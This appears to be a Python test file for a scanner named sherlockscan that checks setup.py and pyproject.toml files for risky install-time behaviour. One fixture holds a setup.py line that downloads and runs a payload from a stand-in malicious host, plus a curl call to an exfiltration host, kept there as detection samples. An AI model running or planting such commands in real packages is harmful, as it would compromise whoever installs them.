#!/usr/bin/env python
# coding: utf-8

# In[ ]:


# tests/test_install_script_analyzer.py

import unittest
import tempfile
import os
import logging
import shutil
from pathlib import Path
from typing import List, Dict, Any, Optional

# Assume sherlockscan is installed or PYTHONPATH is set correctly
# Need to handle potential import errors for dependencies if testing standalone
try:
    from sherlockscan.scanner.install_script_analyzer import (
        scan_install_scripts,
        scan_setup_py,
        scan_pyproject_toml
    )
    TOML_AVAILABLE = True # Assume toml is available via install_script_analyzer
except ImportError:
    # Fallback if toml is not available
    TOML_AVAILABLE = False
    # Define dummy functions if needed for tests to run partially
    def scan_pyproject_toml(path): return []

# Disable logging during tests unless debugging
logging.disable(logging.CRITICAL)

# --- Sample File Contents ---

SAMPLE_RISKY_SETUP_PY = """
import os
import subprocess
import requests # Risky import
from setuptools import setup

# Risky execution
os.system('wget http://malicious.com/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload') # Line 8

# Another one
subprocess.run(['curl', 'http://data.exfil.com'], shell=False) # Line 11

# Eval
code = "'some' + 'code'"
eval(code) # Line 15

setup(
    name='risky_package',
    version='1.0'
    # Normal setup args...
)
"""

SAMPLE_CLEAN_SETUP_PY = """
from setuptools import setup, find_packages

setup(
    name='clean_package',
    version='1.0',
    packages=find_packages(),
    install_requires=['requests'], # Dependencies are checked elsewhere
    description='A safe package.'
)
"""

SAMPLE_RISKY_PYPROJECT_TOML = """
[build-system]
requires = ["setuptools>=42", "wheel", "some_build_dep"]
build-backend = "setuptools.build_meta"
backend-path = ["."] # Custom backend path

[tool.setuptools.cmdclass]
build_py = "custom_build:BuildPyCommand" # Custom command
sdist = "custom_sdist:SDistCommand"
"""

SAMPLE_CLEAN_PYPROJECT_TOML = """
[build-system]
requires = ["setuptools>=42", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "clean_project"
version = "0.1.0"
requires-python = ">=3.8"
dependencies = [
    "requests",
]
"""

INVALID_SYNTAX_SETUP_PY = """
from setuptools import setup
setup(name='invalid'
version='1.0' # Missing comma
)
"""

INVALID_TOML_PYPROJECT = """
[build-system]
requires = ["setuptools] # Missing quote
"""

class TestInstallScriptAnalyzer(unittest.TestCase):
    """Unit tests for the install_script_analyzer module."""

    def setUp(self):
        """Create a temporary directory for test files."""
        self.test_dir = Path(tempfile.mkdtemp(prefix="sherlock_test_install_"))

    def tearDown(self):
        """Remove the temporary directory."""
        shutil.rmtree(self.test_dir)

    def _write_file(self, filename: str, content: str):
        """Helper to write content to a file in the test directory."""
        filepath = self.test_dir / filename
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        return filepath

    def _assert_finding_present(self, findings: List[Dict[str, Any]], expected_type: str, expected_severity: str, expected_line: Optional[int] = None, expected_file: Optional[str] = None):
        """Helper to assert if a specific type of finding is present."""
        found = False
        matching_finding = None
        for finding in findings:
            file_match = (expected_file is None or os.path.basename(finding.get("file_path", "")) == expected_file)
            line_match = (expected_line is None or finding.get("line_number") == expected_line)
            type_match = finding.get("type") == expected_type
            severity_match = finding.get("severity") == expected_severity

            if type_match and severity_match and line_match and file_match:
                 found = True
                 matching_finding = finding
                 break

        assertion_msg = f"Expected finding type='{expected_type}', severity='{expected_severity}'"
        if expected_file: assertion_msg += f" in file '{expected_file}'"
        if expected_line: assertion_msg += f" on line {expected_line}"
        assertion_msg += " not found."

        self.assertTrue(found, assertion_msg)
        return matching_finding

    # --- Test scan_setup_py ---
    def test_scan_setup_py_risky(self):
        """Test scanning a setup.py with risky patterns."""
        setup_path = self._write_file("setup.py", SAMPLE_RISKY_SETUP_PY)
        findings = scan_setup_py(str(setup_path))
        self.assertGreaterEqual(len(findings), 4) # requests import, os.system, subprocess, eval
        self._assert_finding_present(findings, "Install Script Network", "HIGH", 3) # import requests
        self._assert_finding_present(findings, "Install Script Execution", "CRITICAL", 8) # os.system
        self._assert_finding_present(findings, "Install Script Execution", "HIGH", 11) # subprocess.run
        self._assert_finding_present(findings, "Install Script Execution", "CRITICAL", 15) # eval

    def test_scan_setup_py_clean(self):
        """Test scanning a clean setup.py."""
        setup_path = self._write_file("setup.py", SAMPLE_CLEAN_SETUP_PY)
        findings = scan_setup_py(str(setup_path))
        self.assertEqual(len(findings), 0)

    def test_scan_setup_py_syntax_error(self):
        """Test scanning setup.py with syntax errors."""
        setup_path = self._write_file("setup.py", INVALID_SYNTAX_SETUP_PY)
        logging.disable(logging.ERROR) # Suppress expected error
        findings = scan_setup_py(str(setup_path))
        logging.disable(logging.CRITICAL) # Re-enable default
        self.assertEqual(len(findings), 0) # Should not find anything, logs error

    # --- Test scan_pyproject_toml ---
    @unittest.skipIf(not TOML_AVAILABLE, "Skipping test: 'toml' library not available")
    def test_scan_pyproject_toml_risky(self):
        """Test scanning pyproject.toml with risky patterns."""
        toml_path = self._write_file("pyproject.toml", SAMPLE_RISKY_PYPROJECT_TOML)
        findings = scan_pyproject_toml(str(toml_path))
        self.assertEqual(len(findings), 2)
        self._assert_finding_present(findings, "Install Script Custom Build", "INFO", expected_file="pyproject.toml")
        self._assert_finding_present(findings, "Install Script Custom Command", "MEDIUM", expected_file="pyproject.toml")

    @unittest.skipIf(not TOML_AVAILABLE, "Skipping test: 'toml' library not available")
    def test_scan_pyproject_toml_clean(self):
        """Test scanning a clean pyproject.toml."""
        toml_path = self._write_file("pyproject.toml", SAMPLE_CLEAN_PYPROJECT_TOML)
        findings = scan_pyproject_toml(str(toml_path))
        self.assertEqual(len(findings), 0)

    @unittest.skipIf(not TOML_AVAILABLE, "Skipping test: 'toml' library not available")
    def test_scan_pyproject_toml_invalid(self):
        """Test scanning pyproject.toml with invalid TOML syntax."""
        toml_path = self._write_file("pyproject.toml", INVALID_TOML_PYPROJECT)
        logging.disable(logging.ERROR) # Suppress expected error
        findings = scan_pyproject_toml(str(toml_path))
        logging.disable(logging.CRITICAL) # Re-enable default
        self.assertEqual(len(findings), 0) # Should not find anything, logs error

    # --- Test scan_install_scripts (Orchestrator) ---
    @unittest.skipIf(not TOML_AVAILABLE, "Skipping test: 'toml' library not available")
    def test_scan_install_scripts_both_risky(self):
        """Test scanning a directory with risky setup.py and pyproject.toml."""
        self._write_file("setup.py", SAMPLE_RISKY_SETUP_PY)
        self._write_file("pyproject.toml", SAMPLE_RISKY_PYPROJECT_TOML)
        findings = scan_install_scripts(str(self.test_dir))
        self.assertGreaterEqual(len(findings), 6) # 4 from setup.py + 2 from pyproject.toml
        self._assert_finding_present(findings, "Install Script Execution", "CRITICAL", 8, "setup.py")
        self._assert_finding_present(findings, "Install Script Custom Command", "MEDIUM", expected_file="pyproject.toml")

    def test_scan_install_scripts_only_setup_py(self):
        """Test scanning a directory with only setup.py."""
        self._write_file("setup.py", SAMPLE_RISKY_SETUP_PY)
        findings = scan_install_scripts(str(self.test_dir))
        self.assertGreaterEqual(len(findings), 4)
        # Check that no pyproject findings are present
        self.assertFalse(any(f['file_path'].endswith('pyproject.toml') for f in findings))
        self._assert_finding_present(findings, "Install Script Execution", "CRITICAL", 8, "setup.py")

    @unittest.skipIf(not TOML_AVAILABLE, "Skipping test: 'toml' library not available")
    def test_scan_install_scripts_only_pyproject_toml(self):
        """Test scanning a directory with only pyproject.toml."""
        self._write_file("pyproject.toml", SAMPLE_RISKY_PYPROJECT_TOML)
        findings = scan_install_scripts(str(self.test_dir))
        self.assertEqual(len(findings), 2)
         # Check that no setup.py findings are present
        self.assertFalse(any(f['file_path'].endswith('setup.py') for f in findings))
        self._assert_finding_present(findings, "Install Script Custom Command", "MEDIUM", expected_file="pyproject.toml")

    def test_scan_install_scripts_no_scripts(self):
        """Test scanning a directory with no setup.py or pyproject.toml."""
        # Test dir is empty initially
        findings = scan_install_scripts(str(self.test_dir))
        self.assertEqual(len(findings), 0)


if __name__ == '__main__':
    unittest.main()

